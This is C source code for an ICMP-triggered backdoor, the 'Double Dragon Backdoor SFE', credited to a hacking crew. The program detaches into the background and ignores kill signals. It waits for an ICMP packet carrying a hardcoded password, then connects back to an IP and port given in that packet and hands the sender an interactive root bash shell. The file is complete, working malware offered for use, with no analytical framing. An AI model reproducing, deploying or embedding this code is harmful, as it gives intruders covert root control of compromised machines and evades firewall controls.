/*
         Double Dragon Backdoor SFE (Special Firewall Edition)
                by tHE rECIdjVO <recidjvo@pkcrew.org>

                   Member of the Packet Knights Crew
                        http://www.pkcrew.org/

                        ---> Player 1: Ranzou
                                                                */

#define PASSWD "passwd"
#define USER "root"

#define PROGRAM "Double Dragon Backdoor SFE (Special Firewall Edition)"
#define AUTHOR "tHE rECIdjVO <recidjvo@pkcrew.org>"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <pwd.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <grp.h>

// Data to receive
struct cb_data{
    char pass[30];
    u_long jimmy_ip;
    u_short jimmy_port;
};

int main(int argc, char *argv[]);
void wait_icmp(void);
void callback(u_long jimmyip, int jimmyport);

int main(int argc, char *argv[])
{
	// Signal handling
	signal(SIGINT, SIG_IGN);
	signal(SIGHUP, SIG_IGN);
	signal(SIGTERM, SIG_IGN);

	// Going in the background
	if(fork() == 0) {
		setsid();
		wait_icmp();
	}
	exit(0);
}

void callback(u_long jimmyip, int jimmyport)
{
	int jsock, jconn;
	struct sockaddr_in jaddr;
	struct passwd *userent;
	gid_t groups[1];

	setsid();
	// Connect to the caller host
	if((jsock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
		exit(1);
	}

	jaddr.sin_family = AF_INET;
	jaddr.sin_addr.s_addr = inet_addr(inet_ntoa(jimmyip));
	jaddr.sin_port = htons(jimmyport);

	sleep(2);
	if(connect(jsock, &jaddr, sizeof(jaddr)) < 0) {
		exit(2);
	}

	// Dup socket
	dup2(jsock, 0);
	dup2(jsock, 1);
	dup2(jsock, 2);

	// Read user data and set privileges
	if((userent = getpwnam(USER)) == NULL) {
		userent = getpwnam("root");
	}
	initgroups(userent->pw_name, userent->pw_gid);
	setgid(userent->pw_gid);
	setuid(userent->pw_uid);

	// Run the shell
	printf("\n\n\t" PROGRAM "\n\t\tby " AUTHOR "\n\nWelcome, you are now ");
	fflush(stdout); 
	system("whoami");
	execl("/bin/bash", "/bin/bash", "-noprofile", "-norc", "-i", 0);
	close(jsock);
	exit(0);
}

void wait_icmp(void)
{
        char *packet;
        struct ip *pip;
        struct icmp *picmp;
	struct cb_data *pdata;
        int sock, strlen, hincl = 1;
        struct sockaddr_in from;

	// Create socket to receive ICMP data
       	if((sock = socket(AF_INET, SOCK_RAW, 1)) < 0) {
		exit(1);
       	}
       	packet = malloc(sizeof(struct ip) + sizeof(struct icmp) + 64);
       	pip = (struct ip *)packet;
       	picmp = (struct icmp *)(packet + sizeof(struct ip));
       	pdata = (struct cb_data *)(packet + sizeof(struct ip) + sizeof(struct icmp));
       	memset(packet, 0, sizeof(struct ip) + sizeof(struct icmp) + 64);

	strlen = sizeof(from);
	while(1) {
		// Read each ICMP packet searching for a matching passwd
       		recvfrom(sock, packet, sizeof(struct ip) + sizeof(struct icmp) + 64, 0, (struct sockaddr *)&from, &strlen);
		if(strncmp(PASSWD, pdata->pass, sizeof(PASSWD)) == 0) {
			if(fork() != 0) {
				// Start the callback
				callback(pdata->jimmy_ip, pdata->jimmy_port);
			}	
		}
	}
}
